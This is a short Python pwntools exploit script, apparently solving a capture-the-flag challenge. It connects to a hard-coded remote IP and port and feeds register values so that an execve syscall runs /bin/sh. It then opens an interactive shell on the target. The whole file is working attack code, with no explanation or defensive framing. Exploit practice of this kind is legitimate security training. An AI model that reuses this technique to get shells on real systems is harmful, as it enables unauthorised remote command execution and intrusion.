from pwn import *

r = remote('35.200.228.122', 1337)

def set_registers(rax, rdi, rsi, rdx, rcx, r8, r9):
	r.sendafter('RAX: ', str(rax) + '\n')
	r.sendafter('RDI: ', str(rdi) + '\n')
	r.sendafter('RSI: ', str(rsi) + '\n')
	r.sendafter('RDX: ', str(rdx) + '\n')
	r.sendafter('RCX: ', str(rcx) + '\n')
	r.sendafter('R8: ', str(r8) + '\n')
	r.sendafter('R9: ', str(r9) + '\n')

set_registers(
0x3b, #execve syscall
0x00000000006010A0 + 0x20, #address in bss where we place /bin/sh
0x0, #argv
0x0, #envp
u64('/bin/sh\x00'), #/bin/sh
0x1337c0de,
0x1337c0de
)

log.info('Now we wait for a shell :)')

r.interactive()
